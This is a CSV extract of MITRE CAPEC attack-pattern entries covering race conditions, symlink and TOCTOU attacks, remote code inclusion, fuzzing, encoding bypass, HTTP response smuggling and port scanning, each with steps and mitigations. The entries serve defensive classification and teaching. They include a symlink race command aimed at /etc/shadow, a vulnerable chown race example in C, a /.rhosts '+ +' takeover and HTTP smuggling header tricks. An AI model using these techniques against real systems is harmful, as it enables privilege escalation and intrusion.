CAPEC-253,Remote Code Inclusion,Standard,Draft,"The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.",N/A,N/A,N/A,::NATURE:ChildOf:CAPEC ID:175::NATURE:CanPrecede:CAPEC ID:664::,N/A,::Target application server must allow remote files to be included.The malicious file must be placed on the remote machine previously.::,N/A,N/A,N/A,N/A,::Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.::,N/A,::829::,TAXONOMY NAME:WASC:ENTRY ID:05:ENTRY NAME:Remote File Inclusion::,N/A,https://capec.mitre.org/data/definitions/253.html
CAPEC-26,Leveraging Race Conditions,Meta,Stable,"The adversary targets a race condition occurring when multiple processes access and manipulate the same resource concurrently, and the outcome of the execution depends on the particular order in which the access takes place. The adversary can leverage a race condition by running the race, modifying the resource and modifying the normal execution flow. For instance, a race condition can occur while accessing a file: the adversary can trick the system by replacing the original file with their version and cause the system to read the malicious file.",N/A,High,High,N/A,"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary explores to gauge what level of access they have.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary gains access to a resource on the target host. The adversary modifies the targeted resource. The resource's value is used to determine the next normal execution action.::STEP:3:PHASE:Exploit:DESCRIPTION:The resource is modified/checked concurrently by multiple processes. By using one of the processes, the adversary is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the adversary to abuse the target host.::",::A resource is accessed/modified concurrently by multiple processes such that a race condition exists.::The adversary has the ability to modify the resource.::,::SKILL:Being able to run the race requires basic knowledge of concurrent processing including synchonization techniques.:LEVEL:Medium::,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Use safe libraries to access resources such as files.::Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.::Use synchronization to control the flow of execution.::Use static analysis tools to find race conditions.::Pay attention to concurrency problems related to the access of resources.::","::The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057::The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an attacker can replace the file referenced by the name (see [REF-107]). include <sys/types.h>include <fcntl.h>include <unistd.h> define FILE /tmp/myfiledefine UID 100 void test(char *str){int fd;fd = creat(FILE, 0644);if(fd == -1)return; chown(FILE, UID, -1); /* BAD */close(fd); } int main(int argc, char **argv){char *userstr;if(argc > 1) {userstr = argv[1];test(userstr); }return 0; }::",::368::363::366::370::362::662::689::667::665::1223::1254::1298::,N/A,N/A,https://capec.mitre.org/data/definitions/26.html
CAPEC-261,Fuzzing for garnering other adjacent user/sensitive data,Detailed,Draft,An adversary who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide.,N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:54::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.TECHNIQUE:Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.:TECHNIQUE:Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.:TECHNIQUE:Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)::STEP:2:PHASE:Experiment:DESCRIPTION:[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.TECHNIQUE:Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).:TECHNIQUE:Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.::STEP:3:PHASE:Experiment:DESCRIPTION:[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that either provide user/sensitive data or give information about an expected template that could be used to produce this data.::STEP:4:PHASE:Exploit:DESCRIPTION:[Craft exploit payloads] If the logs did not reveal any user/sensitive data, an adversary will attempt to make the fuzzing inputs form to an expected templateTECHNIQUE:Create variants of expected templates that request additional information:TECHNIQUE:Create variants that exclude limiting clauses:TECHNIQUE:Create variants that alter fields taht identify the requester in order to subvert access controls:TECHNIQUE:Repeat different fuzzing variants until sensitive information is divulged::",::The server must assume that the queries it receives follow specific templates and/or have fields or attributes that follow specific procedures. The server must process queries that it receives without adequately checking or sanitizing queries to ensure they follow these templates.::,N/A,"::The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries.::",N/A,N/A,N/A,"::A client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. For this example, additional information might include social security numbers or salaries.::",::20::,N/A,N/A,https://capec.mitre.org/data/definitions/261.html
CAPEC-263,Force Use of Corrupted Files,Detailed,Draft,"This describes an attack where an application is forced to use a file that an attacker has corrupted. The result is often a denial of service caused by the application being unable to process the corrupted file, but other results, including the disabling of filters or access controls (if the application fails in an unsafe way rather than failing by locking down) or buffer overflows are possible.",N/A,N/A,Medium,::NATURE:ChildOf:CAPEC ID:17::,N/A,"::The targeted application must utilize a configuration file that an attacker is able to corrupt. In some cases, the attacker must be able to force the (re-)reading of the corrupted file if the file is normally only consulted at startup.::The severity of the attack hinges on how the application responds to the corrupted file. If the application detects the corruption and locks down, this may result in the denial of services provided by the application. If the application fails to detect the corruption, the result could be a more severe denial of service (crash or hang) or even an exploitable buffer overflow. If the application detects the corruption but fails in an unsafe way, this attack could result in the continuation of services but without certain security structures, such as filters or access controls. For example, if the corrupted file configures filters, an unsafe response from an application could result in simply disabling the filtering mechanisms due to the lack of usable configuration data.::",N/A,::This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any).::,N/A,N/A,N/A,N/A,::829::,N/A,N/A,https://capec.mitre.org/data/definitions/263.html
CAPEC-267,Leverage Alternate Encoding,Standard,Draft,An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.,N/A,High,High,::NATURE:ChildOf:CAPEC ID:153::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.:TECHNIQUE:Manually inspect the application to find entry points.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the Explore phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Try to use different encodings of content in order to bypass validation routines.::","::The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host.::",::SKILL:An adversary can inject different representation of a filtered character in a different encoding.:LEVEL:Low::SKILL:An adversary may craft subtle encoding of input data by using the knowledge that they have gathered about the target host.:LEVEL:Medium::,N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Availability Unreliable Execution Resource Consumption Denial of Service::,"::Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.::","::Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote adversaries to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488::Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.::",::173::172::180::181::73::74::20::697::692::,N/A,N/A,https://capec.mitre.org/data/definitions/267.html
CAPEC-27,Leveraging Race Conditions via Symbolic Links,Detailed,Draft,"This attack leverages the use of symbolic links (Symlinks) in order to write to sensitive files. An attacker can create a Symlink link to a target file not otherwise accessible to them. When the privileged program tries to create a temporary file with the same name as the Symlink link, it will actually write to the target file pointed to by the attackers' Symlink link. If the attacker can insert malicious content in the temporary file they will be writing to the sensitive file by using the Symlink. The race occurs because the system checks if the temporary file exists, then creates the file. The attacker would typically create the Symlink during the interval between the check and the creation of the temporary file.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:29::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Verify that target host's platform supports symbolic links.] This attack pattern is only applicable on platforms that support symbolic links.TECHNIQUE:Research target platform to determine whether it supports symbolic links.:TECHNIQUE:Create a symbolic link and ensure that it works as expected on the given platform.::STEP:2:PHASE:Explore:DESCRIPTION:[Examine application's file I/O behavior] Analyze the application's file I/O behavior to determine where it stores files, as well as the operations it performs to read/write files.TECHNIQUE:Use kernel tracing utility such as ktrace to monitor application behavior.:TECHNIQUE:Use debugging utility such as File Monitor to monitor the application's filesystem I/O calls:TECHNIQUE:Watch temporary directories to see when temporary files are created, modified and deleted.:TECHNIQUE:Analyze source code for open-source systems like Linux, Apache, etc.::STEP:3:PHASE:Experiment:DESCRIPTION:[Verify ability to write to filesystem] The attacker verifies ability to write to the target host's file system.TECHNIQUE:Create a file that does not exist in the target directory (e.g. touch temp.txt in UNIX-like systems):TECHNIQUE:On platforms that differentiate between file creation and file modification, if the target file that the application writes to already exists, attempt to modify it.:TECHNIQUE:Verify permissions on target directory::STEP:4:PHASE:Exploit:DESCRIPTION:[Replace file with a symlink to a sensitive system file.] Between the time that the application checks to see if a file exists (or if the user has access to it) and the time the application actually opens the file, the attacker replaces the file with a symlink to a sensitive system file.TECHNIQUE:Create an infinite loop containing commands such as rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat. Wait for an instance where the following steps occur in the given order: (1) Application ensures that tempfile.dat exists and that the user has access to it, (2) rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat, and (3) Application opens tempfile.dat for writing, and inadvertently opens /etc/shadow for writing instead.:TECHNIQUE:Use other techniques with debugging tools to replace the file between the time the application checks the file and the time the application opens it.::",::The attacker is able to create Symlink links on the target host.::Tainted data from the attacker is used and copied to temporary files.::The target host does insecure temporary file creation.::,"::SKILL:This attack is sophisticated because the attacker has to overcome a few challenges such as creating symlinks on the target host during a precise timing, inserting malicious data in the temporary file and have knowledge about the temporary files created (file name and function which creates them).:LEVEL:Medium::",N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::,"::Use safe libraries when creating temporary files. For instance the standard library function mkstemp can be used to safely create temporary files. For shell scripts, the system utility mktemp does the same thing.::Access to the directories should be restricted as to prevent attackers from manipulating the files. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file.::Follow the principle of least privilege when assigning access rights to files.::Ensure good compartmentalization in the system to provide protected areas that can be trusted.::","::In this naive example, the Unix program foo is setuid. Its function is to retrieve information for the accounts specified by the user. For efficiency, it sorts the requested accounts into a temporary file (/tmp/foo naturally) before making the queries. The directory /tmp is world-writable. The malicious user creates a symbolic link to the file /.rhosts named /tmp/foo. Then, they invokes foo with user as the requested account. The program creates the (temporary) file /tmp/foo (really creating /.rhosts) and puts the requested account (e.g. user password)) in it. It removes the temporary file (merely removing the symbolic link). Now the /.rhosts contains + +, which is the incantation necessary to allow anyone to use rlogin to log into the computer as the superuser. [REF-115]::GNU ed utility (before 0.3) allows local users to overwrite arbitrary files via a symlink attack on temporary files, possibly in the open_sbuf function. See also: CVE-2006-6939::OpenmosixCollector and OpenMosixView in OpenMosixView 1.5 allow local users to overwrite or delete arbitrary files via a symlink attack on (1) temporary files in the openmosixcollector directory or (2) nodes.tmp. See also: CVE-2005-0894::Setuid product allows file reading by replacing a file being edited with a symlink to the targeted file, leaking the result in error messages when parsing fails. See also: CVE-2000-0972::",::367::61::662::689::667::,N/A,N/A,https://capec.mitre.org/data/definitions/27.html
CAPEC-273,HTTP Response Smuggling,Detailed,Stable,"An adversary manipulates and injects malicious content in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., server). See CanPrecede relationships for possible consequences.",::TERM:HTTP Desync:DESCRIPTION:Modification/manipulation of HTTP message headers and body parameters to disrupt and interfere in the interpretation and parsing of HTTP message lengths/boundaries for consecutive HTTP messages by HTTP agents in a HTTP chain or network path.::,Medium,High,::NATURE:ChildOf:CAPEC ID:220::NATURE:PeerOf:CAPEC ID:33::NATURE:CanPrecede:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:593::NATURE:CanPrecede:CAPEC ID:148::NATURE:CanPrecede:CAPEC ID:154::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.TECHNIQUE:Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.::STEP:1:PHASE:Experiment:DESCRIPTION:[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure to intended targets in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, message sizes, and HTTP headers.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause differential HTTP responses by experimenting with identified HTTP Response vulnerabilities] The adversary sends maliciously crafted HTTP request to back-end HTTP infrastructure to inject adversary data into HTTP responses (intended for intermediary and/or front-end client/victim HTTP agents communicating with back-end HTTP infrastructure) for the purpose of interfering with the parsing of HTTP response. The intended consequences of the malicious HTTP request and the subsequent adversary injection and manipulation of HTTP responses will be observed to confirm applicability of identified vulnerabilities in the adversary's plan of attack.TECHNIQUE:Continue the monitoring of HTTP traffic.:TECHNIQUE:Inject additional HTTP headers to utilize various combinations of HTTP Headers within a single HTTP message such as: Content-Length & Transfer-Encoding (CL;TE), Transfer-Encoding & Content-Length (TE;CL), or double Transfer-Encoding (TE;TE), so that additional embedded message or data in the body of the original message are unprocessed and treated as part of subsequent messages by the intended target HTTP agent. From these HTTP Header combinations the adversary observes any timing delays (usually in the form of HTTP 404 Error response) or any other unintended consequences. For CL;TE and TE;CL HTTP headers combination, the first HTTP agent, in the HTTP message path that receives the HTTP message, takes precedence or only processes the one header but not the other, while the second/final HTTP agent processes the opposite header allowing for embedded HTTP message to be ignored and smuggled to the intended target HTTP agent. For TE;TE HTTP headers combination, all HTTP agents in HTTP message path process Transfer-Encoding header, however, adversary obfuscation of one of the Transfer-Encoding headers, by not adhering strictly to the protocol specification, can cause it to be unprocessed/ignored by a designated HTTP agent, hence allowing embedded HTTP messages to be smuggled. See Mitigations for details.:TECHNIQUE:Construct a very large HTTP message via multiple Content-Length headers of various data lengths that can potentially cause subsequent messages to be ignored by an intermediary HTTP agent (e.g., firewall) and/or eventually parsed separately by the target HTTP agent. Note that most modern HTTP infrastructure reject HTTP messages with multiple Content-Length headers.:TECHNIQUE:Monitor HTTP traffic using a tool such as a Network Protocol Analyzer.::STEP:1:PHASE:Exploit:DESCRIPTION:[Perform HTTP Response Smuggling attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.TECHNIQUE:Leverage techniques identified in the Experiment Phase.::","::A vulnerable or compromised server or domain/site capable of allowing adversary to insert/inject malicious content that will appear in the server's response to target HTTP agents (e.g., proxies and users' web browsers).::Differences in the way the two HTTP agents parse and interpret HTTP responses and its headers.::HTTP agents running on HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses.::","::SKILL:Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers.:LEVEL:Medium::SKILL:Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers.:LEVEL:Medium::SKILL:Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers.:LEVEL:Medium::","::Tools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages.::",::Differences in responses processed by the two agents. This requires careful monitoring or a capable log analysis tool.::,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.::Configuration: front-end HTTP agents notice ambiguous requests.::Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.::Configuration: Disable reuse of back-end connections.::Configuration: Use HTTP/2 for back-end connections.::Configuration: Use the same web server software for front-end and back-end server.::Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.::Configuration: Prioritize Transfer-Encoding header over Content-Length, whenever an HTTP message contains both.::Configuration: Disallow HTTP messages with both Transfer-Encoding and Content-Length or Double Content-Length Headers.::Configuration: Disallow Malformed/Invalid Transfer-Encoding Headers used in obfuscation, such as: Headers with no space before the value “chunked” Headers with extra spaces Headers beginning with trailing characters Headers providing a value “chunk” instead of “chunked” (the server normalizes this as chunked encoding) Headers with multiple spaces before the value “chunked” Headers with quoted values (whether single or double quotations) Headers with CRLF characters before the value “chunked” Values with invalid characters::Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)::Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.::Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input.::","::When using Undertow, a Java-based web server in Red Hat's Jboss Enterprise Application Platform version 7.0, the code responsible for parsing HTTP requests permitted invalid characters, that could allow the injection of data into HTTP responses from Undertow to clients when used in tandem with a proxy; allowing for web-cache poisoning, XSS, and confidentiality violation of sensitive information from other HTTP requests sent to Undertow. See also: CVE-2017-2666::Mozilla Firefox and Thunderbird before 1.5.04, with various proxy servers, interpreted HTTP responses differently if HTTP response headers included a space between the header name and colon or if HTTP 1.1 headers were sent through a proxy configured with HTTP 1.0, allowing for HTTP Smuggling vulnerability. See also: CVE-2006-2786::",::74::436::,TAXONOMY NAME:WASC:ENTRY ID:27:ENTRY NAME:HTTP Response Smuggling::,TYPE:Terminology:NOTE:HTTP Splitting – the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender’s intension. The messages sent are 100% valid and RFC compliant [REF-117].::::TYPE:Terminology:NOTE:HTTP Smuggling – the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender’s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way [REF-117].::::TYPE:Relationship:NOTE:HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against.::,https://capec.mitre.org/data/definitions/273.html
CAPEC-28,Fuzzing,Meta,Draft,"In this attack pattern, the adversary leverages fuzzing to try to identify weaknesses in the system. Fuzzing is a software security and functionality testing method that feeds randomly constructed input to the system and looks for an indication that a failure in response to that input has occurred. Fuzzing treats the system as a black box and is totally free from any preconceptions or assumptions about the system. Fuzzing can help an attacker discover certain assumptions made about user input in the system. Fuzzing gives an attacker a quick way of potentially uncovering some of these assumptions despite not necessarily knowing anything about the internals of the system. These assumptions can then be turned against the system by specially crafting user input that may allow an attacker to achieve their goals.",N/A,High,Medium,N/A,"::STEP:1:PHASE:Explore:DESCRIPTION:[Observe communication and inputs] The fuzzing attacker observes the target system looking for inputs and communications between modules, subsystems, or systems.TECHNIQUE:Network sniffing. Using a network sniffer such as wireshark, the attacker observes communications into and out of the target system.:TECHNIQUE:Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the attacker observes the system calls and API calls that are made by the target system, and the nature of their parameters.:TECHNIQUE:Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)::STEP:2:PHASE:Experiment:DESCRIPTION:[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.TECHNIQUE:Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).:TECHNIQUE:Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system.::STEP:3:PHASE:Experiment:DESCRIPTION:[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if anything interesting happens. If failure occurs, determine why that happened. Figure out the underlying assumption that was invalidated by the input.::STEP:4:PHASE:Exploit:DESCRIPTION:[Craft exploit payloads] Put specially crafted input into the system that leverages the weakness identified through fuzzing and allows to achieve the goals of the attacker. Fuzzers often reveal ways to slip through the input validation filters and introduce unwanted data into the system.TECHNIQUE:Identify and embed shell code for the target system.:TECHNIQUE:Embed higher level attack commands in the payload. (e.g., SQL, PHP, server-side includes, etc.):TECHNIQUE:Induce denial of service by exploiting resource leaks or bad error handling.::",N/A,::SKILL:There is a wide variety of fuzzing tools available.:LEVEL:Low::,::Fuzzing tools.::,::A lot of invalid data is fed to the system. Data that cannot have been generated through a legitimate transaction/request. Data is coming into the system within a short period of time and potentially from the same IP.::,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Alter Execution Logic::,"::Test to ensure that the software behaves as per specification and that there are no unintended side effects. Ensure that no assumptions about the validity of data are made.::Use fuzz testing during the software QA process to uncover any surprises, uncover any assumptions or unexpected behavior.::","::A fuzz test reveals that when data length for a particular field exceeds certain length, the input validation filter fails and lets the user data in unfiltered. This provides an attacker with an injection vector to deliver the malicious payload into the system.::",::74::20::,N/A,N/A,https://capec.mitre.org/data/definitions/28.html
CAPEC-285,ICMP Echo Request Ping,Detailed,Stable,"An adversary sends out an ICMP Type 8 Echo Request, commonly known as a 'Ping', in order to determine if a target system is responsive. If the request is not blocked by a firewall or ACL, the target host will respond with an ICMP Type 0 Echo Reply datagram. This type of exchange is usually referred to as a 'Ping' due to the Ping utility present in almost all operating systems. Ping, as commonly implemented, allows a user to test for alive hosts, measure round-trip time, and measure the percentage of packet loss.",N/A,Medium,Low,::NATURE:ChildOf:CAPEC ID:292::,N/A,::The ability to send an ICMP type 8 query (Echo Request) to a remote target and receive an ICMP type 0 message (ICMP Echo Reply) in response. Any firewalls or access control lists between the sender and receiver must allow ICMP Type 8 and ICMP Type 0 messages in order for a ping operation to succeed.::,::SKILL:The adversary needs to know certain linux commands for this type of attack.:LEVEL:Low::,::Scanners or utilities that provide the ability to send custom ICMP queries.::,N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other A successful attack of this kind can identify open ports and available services on a system.::,"::Consider configuring firewall rules to block ICMP Echo requests and prevent replies. If not practical, monitor and consider action when a system has fast and a repeated pattern of requests that move incrementally through port numbers.::",N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/285.html
CAPEC-287,TCP SYN Scan,Detailed,Stable,"An adversary uses a SYN scan to determine the status of ports on the remote target. SYN scanning is the most common type of port scanning that is used because of its many advantages and few drawbacks. As a result, novice attackers tend to overly rely on the SYN scan while performing system reconnaissance. As a scanning method, the primary advantages of SYN scanning are its universality and speed.",N/A,N/A,Low,::NATURE:ChildOf:CAPEC ID:300::,"::STEP:1:PHASE:Experiment:DESCRIPTION:An adversary sends SYN packets to ports they want to scan and checks the response without completing the TCP handshake.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary uses the response from the target to determine the port's state. The adversary can determine the state of a port based on the following responses. When a SYN is sent to an open port and unfiltered port, a SYN/ACK will be generated. When a SYN packet is sent to a closed port a RST is generated, indicating the port is closed. When SYN scanning to a particular port generates no response, or when the request triggers ICMP Type 3 unreachable errors, the port is filtered.::",::This scan type is not possible with some operating systems (Windows XP SP 2). On Linux and Unix systems it requires root privileges to use raw sockets.::,N/A,"::The ability to send TCP SYN segments to a host during network reconnaissance via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other A successful attack of this kind can identify open ports and available services on a system.::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::,N/A,N/A,::200::,N/A,N/A,https://capec.mitre.org/data/definitions/287.html
CAPEC-29,Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions,Standard,Draft,"This attack targets a race condition occurring between the time of check (state) for a resource and the time of use of a resource. A typical example is file access. The adversary can leverage a file access race condition by running the race, meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary could replace or modify the file, causing the application to behave unexpectedly.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:26::,"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary explores to gauge what level of access they have.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary confirms access to a resource on the target host. The adversary confirms ability to modify the targeted resource.::STEP:3:PHASE:Exploit:DESCRIPTION:The adversary decides to leverage the race condition by running the race, meaning that they would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time, the adversary can replace the resource and cause an escalation of privilege.::",::A resource is access/modified concurrently by multiple processes.::The adversary is able to modify resource.::A race condition exists while accessing a resource.::,::SKILL:This attack can get sophisticated since the attack has to occur within a short interval of time.:LEVEL:Medium::,N/A,N/A,::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Alter Execution Logic::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::,"::Use safe libraries to access resources such as files.::Be aware that improper use of access function calls such as chown(), tempfile(), chmod(), etc. can cause a race condition.::Use synchronization to control the flow of execution.::Use static analysis tools to find race conditions.::Pay attention to concurrency problems related to the access of resources.::","::The Net Direct client for Linux before 6.0.5 in Nortel Application Switch 2424, VPN 3050 and 3070, and SSL VPN Module 1000 extracts and executes files with insecure permissions, which allows local users to exploit a race condition to replace a world-writable file in /tmp/NetClient and cause another user to execute arbitrary code when attempting to execute this client, as demonstrated by replacing /tmp/NetClient/client. See also: CVE-2007-1057::The following code illustrates a file that is accessed multiple times by name in a publicly accessible directory. A race condition exists between the accesses where an adversary can replace the file referenced by the name. include <sys/types.h>include <fcntl.h>include <unistd.h> define FILE /tmp/myfiledefine UID 100 void test(char *str){int fd;fd = creat(FILE, 0644);if(fd == -1)return; chown(FILE, UID, -1); /* BAD */close(fd); } int main(int argc, char **argv){char *userstr;if(argc > 1) {userstr = argv[1];test(userstr); }return 0; } [REF-107]::",::367::368::366::370::362::662::691::663::665::,N/A,N/A,https://capec.mitre.org/data/definitions/29.html
